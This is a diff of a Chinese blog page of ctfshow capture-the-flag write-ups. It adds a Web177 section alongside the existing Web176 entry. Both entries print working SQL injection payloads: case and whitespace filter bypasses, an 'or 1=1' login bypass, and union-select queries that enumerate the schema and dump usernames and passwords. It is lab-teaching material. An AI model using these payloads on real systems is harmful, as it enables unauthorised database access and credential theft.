@@ -93,6 +93,7 @@
 <li><a href="#web174">web174</a></li>
 <li><a href="#web175">web175</a></li>
 <li><a href="#web176">web176</a></li>
+<li><a href="#web177">Web177</a></li>
 </ul>
 </li>
 </ul>
@@ -980,6 +981,20 @@
 </ul>
 <h4><span id="web176">web176</span></h4><p>知道有过滤，但不知道过滤的是谁，所以需要尝试一下。<br>首先传入<code>1’--+</code>，有回显。<br>传入<code>1’ --+</code>，有回显，空格没被过滤。<br>传入<code>1&#39; union select database(),2,3 --+</code><br>显示不出数据库，猜测有的字母被过滤，都试了一下，于是发现当传入<code>1&#39; union Select database(),2,3 --+</code><br>说明是select被过滤，但大小写可绕过，所以直接传入<br><code>-1&#39; union Select password,2,3 from ctfshow_user --+</code></p>
 <p>得到flag。</p>
+<h4><span id="web177">Web177</span></h4><p>尝试了三个</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1’--+</span><br><span class="line">1’%23</span><br><span class="line">1’ %23</span><br></pre></td></tr></table></figure>
+
+<p>确定了过滤了空格和–+，可以用%0a和%23代替。</p>
+<ul>
+<li>万能密码：</li>
+</ul>
+<p><code>1&#39;%0aor%0a1=1%23</code></p>
+<ul>
+<li>常规解法</li>
+</ul>
+<p><code>-1&#39;union%0aselect%0apassword,1,2%0afrom%0actfshow_user%23</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 爆数据库</span><br><span class="line">-1&#x27;%0aunion%0aselect%0a1,2,database()%23</span><br><span class="line"># 查表名</span><br><span class="line">-1&#x27;union%0aselect%0a1,2,group_concat(table_name)%0afrom%0ainformation_schema.tables%0awhere%0atable_schema=&quot;ctfshow_web&quot;%23</span><br><span class="line"># 查列名(可省略，因为这道题显示出来了)</span><br><span class="line">-1&#x27;union%0aselect%0a1,2,group_concat(column_name)%0afrom%0ainformation_schema.columns%0awhere%0atable_name=&quot;ctfshow_user&quot;%23</span><br><span class="line"># 爆字段</span><br><span class="line">-1&#x27;union%0aselect%0aid,username,password%0afrom%0actfshow_user%23</span><br></pre></td></tr></table></figure>
+
 <h1><span id="愚人节杯">愚人节杯</span></h1><h2><span id="web">WEB</span></h2><h3><span id="easy_signin">easy_signin</span></h3><p>查看浏览器发现url链接是base64加密。<img src="https://img-blog.csdnimg.cn/img_convert/eea66e162a70efe45a115593662b2631.png" alt="image-20230404183149808"></p>
 <p>base64解码是<code>face.png</code>，尝试<code>flag.txt</code>和<code>flag.php</code>，base64加密后传入都不对，用<code>index.php</code>加密后传入，看源码，然后通过base64解密。</p>
 <p><img src="/2023/04/19/ctfshow-Web%E7%AF%87/image-20230419181149917.png" alt="image-20230419181149917"></p>
